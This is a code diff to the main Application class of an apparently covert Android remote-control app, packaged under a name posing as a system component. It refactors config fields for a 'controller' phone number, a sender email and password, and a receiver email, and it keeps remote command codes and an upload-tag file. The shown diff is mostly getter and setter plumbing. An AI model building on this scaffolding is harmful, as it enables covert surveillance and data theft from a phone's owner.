@@ -6,21 +6,23 @@ import android.app.Application;
 import android.os.Environment;
 
 import com.android.system.controled.util.InitUtil;
+import com.android.system.controled.util.StringUtil;
 
 public class MainApplication extends Application {
-	
+
 	private static final String TAG = "MainApplication";
 
-	public static String controllerTel = "";// 控制者的电话号码
+	private String controllerTel = "";// 控制者的电话号码
 	/**
 	 * 发送者的email和密码，163邮箱
 	 */
-	public static String senderEmailAddr = "";
-	public static String senderPwd = "";
+	private String senderEmailAddr = "";
+	private String senderPwd = "";
+
 	/**
 	 * 接收者的email
 	 */
-	public static String receiverEmailAddr = "";
+	private String receiverEmailAddr = "";
 
 	public static final String PHONE_CODE_UP = "011";// TURN_UP
 	public static final String PHONE_CODE_DOWN = "012";// TURN_DOWN
@@ -62,10 +64,16 @@ public class MainApplication extends Application {
 	public static final File FILE_TAG_UPLOAD_TAG = new File(Environment.getDataDirectory().getAbsolutePath() + "/data/com.android.system.controled/files/uploadtag.cfg");
 	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";
 
+	private static MainApplication instence;
+
+	public static MainApplication getInstence() {
+		return instence;
+	}
 
 	@Override
 	public void onCreate() {
 		super.onCreate();
+		instence = this;
 		Debug.e("", "==============Application   IS onCreate=======================");
 		InitUtil.init(this);
 	}
@@ -76,4 +84,43 @@ public class MainApplication extends Application {
 		super.onTerminate();
 	}
 
+	public String getControllerTel() {
+		if (StringUtil.isNull(controllerTel))
+			InitUtil.initConfig(instence);
+		return controllerTel;
+	}
+
+	public void setControllerTel(String controllerTel) {
+		this.controllerTel = controllerTel;
+	}
+
+	public String getSenderEmailAddr() {
+		if (StringUtil.isNull(senderEmailAddr))
+			InitUtil.initConfig(instence);
+		return senderEmailAddr;
+	}
+
+	public void setSenderEmailAddr(String senderEmailAddr) {
+		this.senderEmailAddr = senderEmailAddr;
+	}
+
+	public String getSenderPwd() {
+		if (StringUtil.isNull(senderPwd))
+			InitUtil.initConfig(instence);
+		return senderPwd;
+	}
+
+	public void setSenderPwd(String senderPwd) {
+		this.senderPwd = senderPwd;
+	}
+
+	public String getReceiverEmailAddr() {
+		if (StringUtil.isNull(receiverEmailAddr))
+			InitUtil.initConfig(instence);
+		return receiverEmailAddr;
+	}
+
+	public void setReceiverEmailAddr(String receiverEmailAddr) {
+		this.receiverEmailAddr = receiverEmailAddr;
+	}
 }
